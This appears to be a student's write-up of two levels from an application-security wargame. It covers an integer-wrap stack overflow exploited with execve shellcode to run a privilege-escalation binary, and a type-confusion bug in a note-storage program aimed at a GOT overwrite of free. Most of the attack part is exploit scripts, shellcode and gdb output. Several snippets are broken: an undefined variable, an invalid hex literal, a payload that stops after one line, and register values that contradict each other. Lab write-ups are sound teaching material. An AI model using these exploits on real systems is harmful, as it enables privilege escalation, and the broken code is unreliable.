we can see size is converted to an unsigned short (16 bit number) which has the range of (0-65535), one way we can make sure we pass the number check whilst still being able to write more than 32 integers would be to: pass a negative number!
that negative number will be wrapped around (-1 -> 65535), we can try this and we see we actually can:
```
students24@appsec2026:/levels/level9$ ./level9
Welcome to the magic number calculator
How many lucky numbers do you have? -1
Please enter 65535 numbers
```

Now we simply need to write the payload.

```
0000000000001189 <read_input>:
    1189:       f3 0f 1e fa             endbr64
    118d:       55                      push   %rbp
    118e:       48 89 e5                mov    %rsp,%rbp
    1191:       48 83 ec 20             sub    $0x20,%rsp <---- 
    1195:       48 89 7d e8             mov    %rdi,-0x18(%rbp)
    1199:       89 f0                   mov    %esi,%eax
    119b:       66 89 45 e4             mov    %ax,-0x1c(%rbp)
    119f:       0f b7 45 e4             movzwl -0x1c(%rbp),%eax
    11a3:       89 c6                   mov    %eax,%esi
    11a5:       48 8d 05 5c 0e 00 00    lea    0xe5c(%rip),%rax        # 2008 <_IO_stdin_used+0x8>
    11ac:       48 89 c7                mov    %rax,%rdi
    11af:       b8 00 00 00 00          mov    $0x0,%eax
    11b4:       e8 c7 fe ff ff          call   1080 <printf@plt>
    11b9:       66 c7 45 fe 00 00       movw   $0x0,-0x2(%rbp)
    11bf:       eb 2f                   jmp    11f0 <read_input+0x67>
    11c1:       0f b7 45 fe             movzwl -0x2(%rbp),%eax
    11c5:       48 8d 14 85 00 00 00    lea    0x0(,%rax,4),%rdx
    11cc:       00 
    11cd:       48 8b 45 e8             mov    -0x18(%rbp),%rax
    11d1:       48 01 d0                add    %rdx,%rax
    11d4:       48 89 c6                mov    %rax,%rsi
    11d7:       48 8d 05 43 0e 00 00    lea    0xe43(%rip),%rax        # 2021 <_IO_stdin_used+0x21>
    11de:       48 89 c7                mov    %rax,%rdi
    11e1:       b8 00 00 00 00          mov    $0x0,%eax
    11e6:       e8 a5 fe ff ff          call   1090 <__isoc99_scanf@plt>
    11eb:       66 83 45 fe 01          addw   $0x1,-0x2(%rbp)
    11f0:       0f b7 45 fe             movzwl -0x2(%rbp),%eax
    11f4:       66 3b 45 e4             cmp    -0x1c(%rbp),%ax
    11f8:       72 c7                   jb     11c1 <read_input+0x38>
    11fa:       90                      nop
    11fb:       90                      nop
    11fc:       c9                      leave
    11fd:       c3                      ret
```

Let's set a breakpoint for read_input's scanf:
```
(gdb) break *0x5555555551e6
Breakpoint 1 at 0x5555555551e6
(gdb) continue
Continuing.
111

Breakpoint 1, 0x00005555555551e6 in read_input ()
(gdb) info registers
rax            0x0                 0
rbx            0x7fffffffe358      140737488347992
rcx            0x0                 0
rdx            0x4                 4
rsi            0x7fffffffe1a4      140737488347556
rdi            0x555555556021      93824992239649
rbp            0x7fffffffe180      0x7fffffffe180
rsp            0x7fffffffe160      0x7fffffffe160
r8             0xa                 10
r9             0x0                 0
r10            0x7ffff7db1fc0      140737351720896
r11            0x7ffff7e038e0      140737352055008
r12            0x1                 1
r13            0x0                 0
r14            0x555555557db0      93824992247216
r15            0x7ffff7ffd000      140737354125312
rip            0x5555555551e6      0x5555555551e6 <read_input+93>
eflags         0x202               [ IF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0
fs_base        0x7ffff7fb2740      1407373
```

We should find our first buffer entry at $rbp+20
```
(gdb) x/d $rbp+0x20
0x7fffffffe1a0: 111 ....
```
Compare this to rbp (0x7fffffffe230):
```
>>> hex(0x7fffffffe230 - 0x7fffffffe1a0)
'0x90'
```
So to overwrite rbp+8 we need to write 38 integers. This time, since we're reading integers, we can easily write zero values as well, which will make things
generally easier. First to write the payload, we will write a helper fnction that converts a byte array into an array of integers so that we can easily input a payload.

```py
import struct
def bytes_to_ints(buf):
    # Pad to align to memory
    remainder = len(buf) % 8
    if remainder:
        buf += b'\x00' * (word_size - remainder)
    
    fmt = '<' + ('Q') * (len(buf) // word_size)
    return list(struct.unpack(fmt, buf))
```

So now all we need to do is construct a payload. We can simply call system() with /bin/sh
```
(gdb) p system
$1 = {int (const char *)} 0x7ffff7c58750 <__libc_system>
```
Now we need to find the /bin/sh pointer (0x7ffff7dcb42f)

```
(gdb) find 0x7ffff7c28000,+300000000, "/bin/sh"
0x7ffff7dcb42f
```

Some addresses to keep track of:
return address in main: 0x000055555555530d
buffer base: 0x7fffffffe1a0
execv:0x7ffff7ceef10
sh addy: 0x7ffff7dcb42f
exit() : 0x7ffff7c47ba0

without gdb env thing:
x/32d 0x7fffffffe1e0

```
0x7fffffffe1bc: 11      11      22      33
0x7fffffffe1cc: 44      2097152 0       2097152
0x7fffffffe1dc: 0       32768   0       -7656
0x7fffffffe1ec: 32767   6       42      0
0x7fffffffe1fc: 0       0       0       0
0x7fffffffe20c: 0       0       0       0
0x7fffffffe21c: 0       0       0       0
0x7fffffffe22c: 0       0       0       -134325520
```


Now we can attempt to open a shell. Writing the payload:
```py

import sys
import struct

print('-65433') #this allows us to write a number of bytes
 
def create_shellcode_absolute(str_addy):
    """Create shellcode with absolute address of string"""
    # Convert address to little-endian bytes
    addr_bytes = str_addy.to_bytes(8, byteorder='little')

    shellcode = (
        b"\x48\x31\xf6"              # xor rsi, rsi  (argv = NULL)
        b"\x48\x31\xd2"              # xor rdx, rdx  (envp = NULL)
        b"\x48\xbf" + addr_bytes +   # mov rdi, str_addy  <-- direct pointer
        b"\x48\x31\xc0"              # xor rax, rax
        b"\xb0\x3b"                  # mov al, 0x3b (execve)
        b"\x0f\x05"                  # syscall
    )
    return shellcode

# Offset to return address (144 bytes to rbp + 8)
offset = 152

# Buffer base address (from your GDB: 0x7fffffffe1a0)
buffer_base = 0x7fffffffe1e0 #adjusted for GDB environment stack replacement
size_shell = len(create_shellcode_absolute(0x7fffffffe1a0))

# Build payload: NOP sled + shellcode + padding + return address
nop_sled = b'\x90' * 50 # for this purpose a nop sled is not actually necessary, but w/e
payload = nop_sled + create_shellcode_absolute(buffer_base + len(nop_sled) + size_shell)
payload += b'/usr/local/bin/escalate\x00'
payload += b'A' * (offset - len(payload))
payload += struct.pack('<Q', buffer_base)  # Jump to buffer start

# Convert to 32-bit integers for scanf("%d")
for i in range(0, len(payload), 4):
    chunk = payload[i:i+4]
    if len(chunk) < 4:
        chunk = chunk + b'\x00' * (4 - len(chunk))
    val = struct.unpack('<i', chunk)[0]
    print(val)

```

# Level 10
students24@appsec2026:/levels/level10$ ls -la
dr-xr-x---  2 root level9   4096 Mar 17 09:49 .
dr-xr-xr-x 12 root root     4096 Mar 17 09:49 ..
-r-xr-sr-x  1 root level10 16888 Mar 17 09:49 level10
-r--r-----  1 root level9   4326 Mar 17 09:48 level10.c
-r--r-----  1 root level9    661 Mar 17 09:48 memory_cells.h

```c
students24@appsec2026:/levels/level10$ cat memory_cells.h
#ifndef __MEMORY_CELLS_H__
#define __MEMORY_CELLS_H__

typedef enum MemoryType {
    TYPE_NONE,
    TYPE_INT,
    TYPE_FLOAT,
    TYPE_STRING
} MemoryType;

typedef struct __attribute__((packed)) Memory {
    MemoryType type;
    char padding[16];
} Memory;

typedef struct __attribute__((packed)) MemoryInt {
    MemoryType type;
    long long value;
    char padding[8];
} MemoryInt;

typedef struct __attribute__((packed)) MemoryFloat {
    MemoryType type;
    double value;
    char padding[8];
} MemoryFloat;

typedef struct __attribute__((packed)) MemoryString {
    MemoryType type;
    char* location;
    size_t location_size;
} MemoryString;
#endif
```

```c
students24@appsec2026:/levels/level10$ cat level10.c
#include <stdio.h>
#include <stddef.h>
#include <string.h>
#include <stdlib.h>

#include "memory_cells.h"

#define MAX_MEMORY (128)

Memory memory[MAX_MEMORY];

void set_int(MemoryInt* mem, long long value) {
    mem->value = value;
}

void set_float(MemoryFloat* mem, double value) {
    mem->value = value;
}

void set_string(MemoryString* mem, const char* value) {
    if(mem->type != TYPE_STRING)
        return;

    size_t value_size = strlen(value);
    if(value_size > 0 && value[value_size-1] == '\n')
        --value_size;
    
    if(value_size != mem->location_size) {
        free(mem->location);
        mem->location = malloc(value_size);
        mem->location_size = value_size;
    }
    
    memcpy(mem->location, value, value_size);
};

void handle_allocate(const char* args) {
    int slot, type;
    if(sscanf(args, "%d %d", &slot, &type) < 2)
        return;
    if(slot < 0 || slot >= MAX_MEMORY)
        return;
        
    if(memory[slot].type == TYPE_STRING) {
        free(((MemoryString*)&memory[slot])->location);
    }
    
    if(type == TYPE_INT) {
        MemoryInt* val = (MemoryInt*)(&memory[slot]);
        val->type = TYPE_INT;
        val->value = 0.0;
    }
    if(type == TYPE_FLOAT) {
        MemoryFloat* val = (MemoryFloat*)(&memory[slot]);
        val->type = TYPE_FLOAT;
        val->value = 0;
    }
    if(type == TYPE_STRING) {
        MemoryString* val = (MemoryString*)(&memory[slot]);
        val->type = TYPE_STRING;
        val->location = NULL;
        val->location_size = 0;
    }
}

void handle_setint(const char* args) {
    int slot;
    long long arg;
    if(sscanf(args, "%d %lld", &slot, &arg) < 2)
        return;
    
    if(slot >= 0 && slot < MAX_MEMORY)
        set_int((MemoryInt*)&memory[slot], arg);
}

void handle_setfloat(const char* args) {
    int slot;
    double arg;
    if(sscanf(args, "%d %lf", &slot, &arg) < 2)
        return;
    
    if(slot >= 0 && slot < MAX_MEMORY)
        set_float((MemoryFloat*)&memory[slot], arg);
}

void handle_setstring(const char* args) {
    size_t end_idx = 0;
    while(args[end_idx] != '\0' && args[end_idx] != ' ') {
        ++end_idx;
    }
    
    if(args[end_idx] == '\0')
        return;
    
    int slot;
    if(sscanf(args, "%d", &slot) < 1)
        return;
    
    if(slot >= 0 && slot < MAX_MEMORY)
        set_string((MemoryString*)&memory[slot], &args[end_idx+1]);
}

void handle_print(const char* args) {
    int slot;
    if(sscanf(args, "%d", &slot) < 1)
        return;
    if(slot < 0 || slot >= MAX_MEMORY)
        return;
    
    printf("Slot type: %d\n", (int)memory[slot].type);
    if(memory[slot].type == TYPE_INT)
        printf("Slot value: %lld\n", ((MemoryInt*)&memory[slot])->value);
    if(memory[slot].type == TYPE_FLOAT)
        printf("Slot value: %lf\n", ((MemoryFloat*)&memory[slot])->value);
    if(memory[slot].type == TYPE_STRING) {
        printf("Slot value: ");
        MemoryString* str = (MemoryString*)&memory[slot];
        fwrite(str->location, 1, str->location_size, stdout);
        fflush(stdout);
        printf("\n");
    }
}

void handle_line(const char* line) {
    size_t substr_idx = 0;
    while(line[substr_idx] != '\0' && line[substr_idx] != ' ') {
        ++substr_idx;
    }
    if(line[substr_idx] == '\0')
        return;
    ++substr_idx;
    
    if(strncmp(line, "allocate", 8) == 0)
        handle_allocate(&line[substr_idx]);
    if(strncmp(line, "setint", 6) == 0)
        handle_setint(&line[substr_idx]);
    if(strncmp(line, "setfloat", 8) == 0)
        handle_setfloat(&line[substr_idx]);
    if(strncmp(line, "setstring", 9) == 0)
        handle_setstring(&line[substr_idx]);
    if(strncmp(line, "print", 5) == 0)
        handle_print(&line[substr_idx]);
}

int main() {
    puts("Welcome to the note storage system");
    puts("Valid commands are:");
    puts("    allocate <int> <int>");
    puts("    setint <int> <int>");
    puts("    setfloat <int> <float>");
    puts("    setstring <int> <string>");
    puts("    print <int>");
    
    for(size_t i = 0; i < MAX_MEMORY; ++i) {
        memory[i].type = TYPE_NONE;
    }
    
    char* line = NULL;
    size_t n = 0;
    while(getline(&line, &n, stdin) != -1) {
        handle_line(line);
        
        free(line);
        line = NULL;
        n = 0;
    }
    return 0;
}
```

The approach here is to use the memory read and write associated with the string methods (and the non-existent type checking) to leverage reading and executing unwanted memory.
Running it in gdb with the COLUMNS, LINES and TERM environment variables unset (to avoid wrong stack alignment):

System address: 0x7ffff7c58750

We can further leverage this by overwriting the pointers of the functions associated with the strings free. Get the GOT entry of free

```
students24@appsec2026:/levels/level10$ objdump -R ./level10 | grep free
0000000000003f78 R_X86_64_JUMP_SLOT  free@GLIBC_2.2.5
```

We can write the payload as such:

```py
import struct, sys

FREE_GOT = 0x3f78 
SYSTEM   = 0x7f ff f7c58750
ESCALATE = '/usr/local/bin/escalate'

payload = "allocate 0 3\n"

sys.stdout.buffer.write(payload)
```